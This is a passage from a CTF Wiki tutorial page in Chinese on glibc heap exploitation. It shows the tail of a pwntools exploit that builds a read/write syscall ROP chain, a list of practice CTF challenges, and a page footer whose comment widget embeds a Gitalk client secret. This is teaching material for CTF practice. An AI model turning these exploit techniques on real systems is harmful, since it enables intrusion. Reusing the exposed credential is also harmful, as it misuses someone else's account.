    <span class="n">rops</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="n">rops</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x260</span><span class="p">)</span>
    <span class="n">rops</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_rdx</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span>
    <span class="n">rops</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_rax</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">rops</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
    <span class="c1">#rops += p64(libc.sym[&#39;read&#39;])</span>
    <span class="c1">#write</span>
    <span class="n">rops</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_rdi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">rops</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_rsi</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x260</span><span class="p">)</span>
    <span class="n">rops</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_rdx</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x70</span><span class="p">)</span>
    <span class="n">rops</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_rax</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">rops</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
    <span class="n">Add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">rops</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">(</span><span class="s1">&#39;$ xmzyshypnc&#39;</span><span class="p">)</span>

<span class="n">exp</span><span class="p">()</span>
</code></pre></div>
<h3 id="0x06">0x06 建议习题：<a class="headerlink" href="#0x06" title="Permanent link">&para;</a></h3>
<ul>
<li>2018 HITCON children_tcache</li>
<li>2018 BCTF houseOfAtum</li>
<li>2019 HTICON Lazy House</li>
<li>2020 XCTF no-Cov twochunk</li>
</ul>
                
              
              
                <!-- Set from config but allow override -->
   

<hr>
<blockquote class="page-copyright">
    <p>本页面的全部内容在 <strong>CC BY-NC-SA 4.0</strong> 协议之条款下提供，附加条款亦可能应用。</p>
</blockquote>
<!-- Comments Integration -->
 
<h2 id="__comments">评论</h2>
<form id="gitalk-form" onsubmit="return false;">
    <div id="gitalk-container"></div>
</form>
<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
<script src="https://cdnjs.loli.net/ajax/libs/blueimp-md5/2.10.0/js/md5.min.js"></script>
<script>
    const gitalk = new Gitalk({
        clientID: 'd78d2e8d782d95560289',
        clientSecret: '954f1e7f8ae9b2566272a2105fe8df60b50e8e9b',
        repo: 'comment',
        owner: 'ctf-wiki',
        admin: ['40huo', 'iromise'],
        id: md5(location.pathname),      // Ensure uniqueness and length less than 50
        distractionFreeMode: false  // Facebook-like distraction free mode
    })

    gitalk.render('gitalk-container')
</script> 
              
            </article>
          </div>
        </div>
      </main>
      
        
<footer class="md-footer">
  
    <div class="md-footer-nav">
      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
        
          <a href="../large_bin_attack-zh/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
            <div class="md-footer-nav__button md-icon">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
            </div>
            <div class="md-footer-nav__title">
              <div class="md-ellipsis">
                <span class="md-footer-nav__direction">
                  上一页
                </span>
                Large Bin Attack
              </div>
            </div>
          </a>
        
        
          <a href="../house_of_einherjar-zh/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
            <div class="md-footer-nav__title">
              <div class="md-ellipsis">
                <span class="md-footer-nav__direction">
                  下一页
                </span>
                House of Einherjar
              </div>
            </div>
            <div class="md-footer-nav__button md-icon">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
            </div>
          </a>
        
      </nav>
    </div>
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-footer-copyright">
        
          <div class="md-footer-copyright__highlight">
            Copyright &copy; 2016 - 2020 CTF Wiki Team
          </div>
        
        Made with
        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
          Material for MkDocs
        </a>
      </div>
      
    </div>
  </div>
</footer>
      
    </div>
    
      <script src="../../../../assets/javascripts/vendor.a018d6bb.min.js"></script>
      <script src="../../../../assets/javascripts/bundle.4b42b5e6.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
      
      <script>
        app = initialize({
          base: "../../../..",
          features: ['tabs'],
          search: Object.assign({
            worker: "../../../../assets/javascripts/worker/search.4ac00218.min.js"
          }, typeof search !== "undefined" && search)
        })
      </script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
      
        <script src="../../../../_static/js/extra.js"></script>
      
        <script src="https://cdnjs.loli.net/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML"></script>
      
        <script src="../../../../search/main.js"></script>
      
    
  </body>
</html>